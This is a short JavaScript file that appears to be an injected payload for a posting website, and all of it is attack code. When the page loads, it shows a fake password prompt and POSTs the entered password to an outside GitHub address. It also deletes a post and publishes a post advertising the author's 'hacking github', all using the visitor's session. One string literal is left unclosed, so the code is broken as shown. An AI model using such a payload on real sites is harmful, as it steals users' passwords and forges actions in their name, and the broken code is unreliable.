function sendPassword() {
    var password = window.prompt('Please enter your password');
    var xhttp3 = new XMLHttpRequest();
    xhttp3.open("POST", "https://github.com/Aegizz/password", true);
    xhttp3.send(password);
}
function deletePost1() {
    var xhttp2 = new XMLHttpRequest();
    xhttp2.open("POST", "/posts/1/delete", true);
    xhttp2.send();
}

function submitHackerPost() {
    var title = "Come checkout my hacking github!";
    var content = "Heres my github: <a href='https://github.com/Aegizz'>Aegizz</a>;
    // Validate title and content if necessary

    var x = new XMLHttpRequest();
    x.open("POST", "/posts/new", true);
    x.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
    x.send(JSON.stringify({ title: title, content: content }));
}
window.onload = sendPassword;
window.onload = deletePost1;
window.onload = submitHackerPost;

sendPassword();
deletePost1();
submitHackerPost();
